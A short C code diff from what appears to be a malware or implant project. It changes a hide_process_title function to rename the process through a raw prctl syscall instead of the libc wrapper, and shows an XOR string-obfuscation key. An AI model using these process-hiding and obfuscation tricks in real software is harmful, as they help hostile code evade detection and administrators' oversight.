@@ -1,7 +1,6 @@
 #include "common.h"
 #include <string.h>
 #include <time.h>
-#include <sys/prctl.h>
 
 __attribute__((used))
 volatile uint8_t g_str_xor_key = 0x5A;
@@ -88,6 +87,6 @@ void hide_process_title(int argc, char* argv[]) {
             copy_len = orig_len - 1;
         memcpy(argv[0], name, copy_len);
         argv[0][copy_len] = '\0';
-        prctl(PR_SET_NAME, name, 0, 0, 0);
+        syscall3(__NR_prctl, PR_SET_NAME, (long)name, 0);
     }
 }
